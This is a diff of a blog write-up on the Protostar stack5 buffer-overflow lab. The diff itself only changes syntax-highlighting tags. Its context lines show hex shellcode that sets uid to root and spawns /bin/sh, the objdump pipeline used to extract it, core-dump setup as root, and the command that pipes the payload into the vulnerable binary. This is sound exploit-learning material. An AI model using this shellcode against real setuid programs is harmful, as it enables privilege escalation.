@@ -220,7 +220,7 @@ ld -melf_i386 -o get_shell get_shell.o
 ./get_shell
 So we get a shell now.
 We need to get shell code as hex. Using objdump and regex dump from my SE course
-{% highlight shell_session %}
+{% highlight shell %}
 madhurrawat@madhurrawrat-VirtualBox:~/Desktop/shellcode$ objdump -D ./get_shell.o |grep '[0-9a-f]:'|grep -v 'file'|cut -f2 -d:|cut -f1-6 -d' '|tr -s ' '|tr '\t' ' '|sed 's/ $//g'|sed 's/ /\\x/g'|paste -d '' -s |sed 's/^/"/'|sed 's/$/"/g'
 "\x31\xc0\xb0\x46\x31\xdb\x31\xc9\xcd\x80\xeb\x18\x59\x31\xc0\x88\x41\x07\x89\x71\x08\x89\x41\x0c\xb0\x0b\x8d\x19\x8d\x51\x0c\x8d\x49\x08\xcd\x80\xe8\xe3\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68"
 {% endhighlight %}
@@ -254,7 +254,7 @@ Maybe because of this reason mentioned in [link][core-need]
 So better we analyze core file:
 
 So we login as root in protostar
-{% highlight shell_session %}
+{% highlight shell %}
 root@protostar:/# echo 2 > /proc/sys/fs/suid_dumpable
 root@protostar:/# cat /proc/sys/kernel/core_pattern
 /tmp/core.%s.%e.%p
@@ -307,7 +307,7 @@ So we see in coredumps buffer is starting from 0xbffffcb0.
 Since we will be starting from 0xbffffcb0 our RET should now point to it, ie
 beginning of our shell code.
 
-{% highlight shell_session %}
+{% highlight shell %}
 $ python pwn5.py > payload5
 $  (cat payload5; cat) | /opt/protostar/bin/stack5
 
